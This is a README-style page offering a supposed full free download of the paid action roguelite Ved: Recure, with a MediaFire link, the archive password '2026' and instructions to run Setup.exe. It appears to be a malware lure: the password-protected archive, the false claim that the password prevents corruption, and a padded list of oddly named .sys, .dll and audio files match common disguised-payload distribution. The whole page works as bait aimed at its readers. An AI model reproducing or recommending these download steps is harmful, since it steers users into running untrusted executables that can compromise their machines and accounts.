## 🕹️ About

Ved: Recure is a fast-paced third-person action roguelite developed and published by SummerClip. After buying their 1000th game following another exhausting overtime shift, the protagonist wakes inside a strange Recure facility and must clear it to return to reality. Combat focuses on blocking, dodging, striking, boss encounters, and customizable buff chains built from nine core attributes and more than 150 unique buffs. Across four distinct stages, players collect equipment, refine strategic builds, and challenge 16 powerful bosses. This release is prepared as a complete package for straightforward installation of the full game.

Ved: Recure is made for players who enjoy stylish third-person action, challenging boss fights, roguelite experimentation, and build-focused progression.

## ✨ Features

- 🔗 **Custom Buff Chains** — Connect buffs and triggers to create flexible combat builds.
- ⚔️ **Fast-Paced Combat** — Block, dodge, strike, and master precise action-focused encounters.
- 🎮 **Single-Player Adventure** — Experience a focused action RPG campaign built for solo play.
- 🗺️ **Four Distinct Stages** — Explore varied environments within the mysterious Recure facility.
- 👹 **Boss Battles** — Face 16 powerful bosses that test every part of your build.
- 🎒 **Equipment Progression** — Collect unique equipment with traits that influence your buffs.

| Platform | Status |

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- installer.dat <- Installer data
|-- dlc.md5 <- DLC checksums
|-- update_1.res <- Update resources
|-- driver.pak <- Driver archive
|-- audio.res <- Audio resources
|-- Password 2026.txt <- Password reminder (empty)
|-- settings.bin <- Configuration
|-- api.pak <- API modules
|-- scripts.lic <- Game scripts
|-- patch_1.bnk <- Audio banks
|-- animations.dll <- Animation system
|-- launcher.dll <- Launcher library
|-- update_1.ini <- Update config
|-- res.pak <- Resources archive
|-- assets.wem <- Asset audio
|-- license.wem <- Audio assets
|-- physics.sys <- Physics engine
|-- driver.umap <- Driver data
|-- uninstall.key <- Uninstall key
|-- global.cfg <- Global settings
|-- localization.ini <- Language files
|-- bootstrap.wem <- Bootstrap audio
|-- license.bank <- License data
|-- lang.sys <- Language system
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
